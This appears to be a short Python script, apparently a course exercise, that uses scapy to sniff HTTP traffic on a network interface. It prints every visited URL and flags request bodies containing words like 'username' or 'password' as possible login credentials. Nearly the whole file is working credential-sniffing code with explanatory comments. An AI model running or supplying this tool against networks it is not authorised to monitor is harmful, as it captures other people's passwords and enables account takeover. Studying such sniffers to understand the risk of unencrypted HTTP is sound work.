#!/usr/bin/python3

import scapy.all as scapy
from scapy.layers import http ##Imports a third party module that allows scapy to sniff on http.

def sniff(interface):
	scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet) ##scapy.sniff does all the hardwork of sniffing data for us. iface is just the interface to use. store=False is to tell scapy to not store any results in memory. prn argument calls another function evrytime we sniff a packet, in this case, process_sniffed_packet().

def get_URL(packet):
		url= str(packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path)
		url = url.replace(url[:2], '', 1)
		url = url.rstrip(url[-1])
		return url
	
def process_sniffed_packet(packet): ## Prints sniffed packets that are sent over http.
	if packet.haslayer(http.HTTPRequest): ##Filters packets only packets that have http layer.
		url = get_URL(packet)	
		print("[+] URL found: " + url)
		if packet.haslayer(scapy.Raw):
			load= str(packet[scapy.Raw].load)
			load = load.replace(load[:2], '', 1)
			load = load.rstrip(load[-1])
			if "username" in str(load) or "uname" in str(load) or "login" in str(load) or "pass" in str(load) or "password" in str(load) : 
				print('\n\n[+] Possible username and password combo: "' + str(load) + '" for url: ' + str(url) + "\n\n")
	
sniff("eth0") ##calling sniff function with interface "eth0".